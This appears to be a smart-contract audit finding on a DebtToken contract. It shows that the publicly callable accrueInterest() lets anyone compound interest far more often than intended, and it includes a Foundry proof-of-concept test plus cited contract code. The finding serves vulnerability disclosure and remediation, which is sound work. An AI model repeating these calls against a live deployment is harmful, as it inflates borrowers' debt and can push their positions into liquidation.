### Title
Anyone can increase borrower debt by forcing frequent interest compounding - (File: contracts/DebtToken.sol)

### Summary
`DebtToken.accrueInterest()` is publicly callable and checkpoints accrued interest into `totalSupply_` and `debtIndex`. Because each subsequent accrual uses the already-grown `totalSupply_`, an unprivileged caller can compound interest at every block boundary, converting the documented APR into a higher effective APY and increasing every borrower’s debt.

### Finding Description
`accrueInterest()` has no caller restriction, minimum interval, or other access control. [1](#0-0) 

On each invocation after a timestamp change, the contract adds the newly calculated interest to `totalSupply_` and updates `debtIndex`. [2](#0-1) 

The next calculation multiplies the elapsed rate by the already-increased `totalSupply_`, making the result dependent on accrual frequency. [3](#0-2) 

This contradicts the configured rate’s documented APR semantics. [4](#0-3) 

### Impact Explanation
An attacker can call `accrueInterest()` whenever a new block timestamp is observed, causing interest to compound far more frequently than once per year. For example, a configured 10% APR approaches approximately 10.52% APY under daily compounding and approximately 10.517% APY under continuous compounding; the effect grows substantially at higher configured rates.

The increased `debtIndex` raises all borrowers’ `balanceOf()` results, while the accrued amount is minted to the fee collector as synthetic-token revenue. [5](#0-4) [6](#0-5) 

This can push positions across liquidation thresholds earlier than intended and transfers value from borrowers through excess interest-debt accrual.

### Likelihood Explanation
Any EOA or contract can invoke the function directly; no `onlyGovernor`, `onlyPool`, reentrancy guard, pause check, or sender validation is applied. [7](#0-6) 

The attack only requires an outstanding debt supply and a nonzero interest rate. Repeated calls are limited by block timestamps rather than permissions.

### Recommendation
Do not make accrual frequency affect the total accrued amount. Track interest against the outstanding principal/schedule or use a mathematically continuous debt index that is independent of checkpoint frequency. If checkpointing remains necessary, enforce a minimum accrual interval and remove the dependency on arbitrary public callers; simply making the function privileged would not fix compounding caused by calls from `issue()`, `repay()`, and other state-changing paths.

### Proof of Concept
This Foundry test can be added to `DebtTokenInvariant_Test`, whose `setUp()` already creates `underlying`, `depositToken`, `debtToken`, and `syntheticToken`. [8](#0-7) 

```solidity
function test_publicAccrualCompoundsInterest() public {
    address user = address(0xA11CE);

    debtToken.updateInterestRate(0.1e18); // documented 10% APR

    underlying.mint(user, 10_000e18);
    vm.startPrank(user);
    underlying.approve(address(depositToken), type(uint256).max);
    depositToken.deposit(10_000e18, user);
    debtToken.issue(100e18, user);
    vm.stopPrank();

    uint256 snapshot = vm.snapshot();

    // Lazy accrual: the expected APR result is approximately 110.
    vm.warp(block.timestamp + 365.25 days);
    uint256 lazyDebt = debtToken.balanceOf(user);
    assertApproxEqRel(lazyDebt, 110e18, 0.001e18);

    vm.revertTo(snapshot);

    // An unprivileged caller compounds once per day.
    for (uint256 i; i < 365; ++i) {
        vm.warp(block.timestamp + 1 days);
        vm.prank(address(0xBAD));
        debtToken.accrueInterest();
    }

    vm.warp(block.timestamp + 0.25 days);
    uint256 compoundedDebt = debtToken.balanceOf(user);

    assertGt(compoundedDebt, lazyDebt);
    assertApproxEqRel(compoundedDebt, 110.51e18, 0.001e18);
}
```

On a live fork, the same behavior is reproduced by an attacker calling `DebtToken.accrueInterest()` once per block; each call checkpoints interest into `totalSupply_`, causing subsequent elapsed-time calculations to compound the previously accrued interest.

### Citations

**File:** contracts/DebtToken.sol (L156-177)
```text
    function accrueInterest() public override {
        (
            uint256 _interestAmountAccrued,
            uint256 _debtIndex,
            uint256 _lastTimestampAccrued
        ) = _calculateInterestAccrual();

        if (block.timestamp == _lastTimestampAccrued) {
            return;
        }

        lastTimestampAccrued = block.timestamp;

        if (_interestAmountAccrued > 0) {
            totalSupply_ += _interestAmountAccrued;
            debtIndex = _debtIndex;

            // Note: Address states where minting will fail (e.g. the token is inactive, it reached max supply, etc)
            try syntheticToken.mint(pool.feeCollector(), _interestAmountAccrued + pendingInterestFee) {
                pendingInterestFee = 0;
            } catch {
                pendingInterestFee += _interestAmountAccrued;
```

**File:** contracts/DebtToken.sol (L196-205)
```text
    function balanceOf(address account_) public view override returns (uint256) {
        uint256 _principal = principalOf[account_];
        if (_principal == 0) {
            return 0;
        }

        (, uint256 _debtIndex, ) = _calculateInterestAccrual();

        // Note: The `debtIndex / debtIndexOf` gives the interest to apply to the principal amount
        return (_principal * _debtIndex) / debtIndexOf[account_];
```

**File:** contracts/DebtToken.sol (L559-564)
```text
        if (block.timestamp > _lastTimestampAccrued) {
            uint256 _interestRateToAccrue = interestRatePerSecond() * (block.timestamp - _lastTimestampAccrued);
            if (_interestRateToAccrue > 0) {
                _interestAmountAccrued = _interestRateToAccrue.wadMul(totalSupply_);
                _debtIndex += _interestRateToAccrue.wadMul(_debtIndex);
            }
```

**File:** contracts/storage/DebtTokenStorage.sol (L50-54)
```text
    /**
     * @notice Interest rate
     * @dev Use 0.1e18 for 10% APR
     */
    uint256 public override interestRate;
```

**File:** test/foundry/DebtToken.invariants.t.sol (L36-99)
```text
    function setUp() public {
        masterOracle = new MasterOracleMock();

        poolRegistry = new PoolRegistry();
        vm.store(address(poolRegistry), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        poolRegistry.initialize({masterOracle_: masterOracle, feeCollector_: feeCollector});

        ERC20Mock esMET = new ERC20Mock("esMET", "esMET", 18);
        feeProvider = new FeeProvider();
        vm.store(address(feeProvider), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        feeProvider.initialize({poolRegistry_: poolRegistry, esMET_: IESMET(address(esMET))});

        pool = new Pool();
        vm.store(address(pool), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        pool.initialize(poolRegistry);
        pool.updateFeeProvider(feeProvider);
        poolRegistry.registerPool(address(pool));

        SmartFarmingManager smartFarmingManager = new SmartFarmingManager();
        vm.store(address(smartFarmingManager), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        smartFarmingManager.initialize(pool);
        pool.updateSmartFarmingManager(smartFarmingManager);

        underlying = new ERC20Mock("dai", "dai", 18);

        depositToken = new DepositToken();
        vm.store(address(depositToken), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        depositToken.initialize({
            underlying_: underlying,
            pool_: pool,
            name_: "msdDAI",
            symbol_: "msdDAI",
            decimals_: 18,
            collateralFactor_: 0.5e18,
            maxTotalSupply_: type(uint128).max
        });
        pool.addDepositToken(address(depositToken));

        syntheticToken = new SyntheticToken();
        vm.store(address(syntheticToken), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        syntheticToken.initialize({name_: "msUSD", symbol_: "msUSD", decimals_: 18, poolRegistry_: poolRegistry});
        syntheticToken.updateMaxTotalSupply(type(uint128).max);

        debtToken = new DebtToken();
        vm.store(address(debtToken), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        debtToken.initialize({
            name_: "msUSD-Debt",
            symbol_: "msUSD-Debt",
            pool_: pool,
            syntheticToken_: syntheticToken,
            interestRate_: 0,
            maxTotalSupply_: type(uint256).max
        });
        pool.addDebtToken(debtToken);

        treasury = new Treasury();
        vm.store(address(treasury), bytes32(uint256(0)), bytes32(uint256(0))); // Undo initialization made by constructor
        treasury.initialize(pool);
        pool.updateTreasury(treasury);

        masterOracle.updatePrice(address(underlying), 1e18);
        masterOracle.updatePrice(address(syntheticToken), 1e18);

        debtTokenHandler = new DebtTokenHandler(debtToken);
```
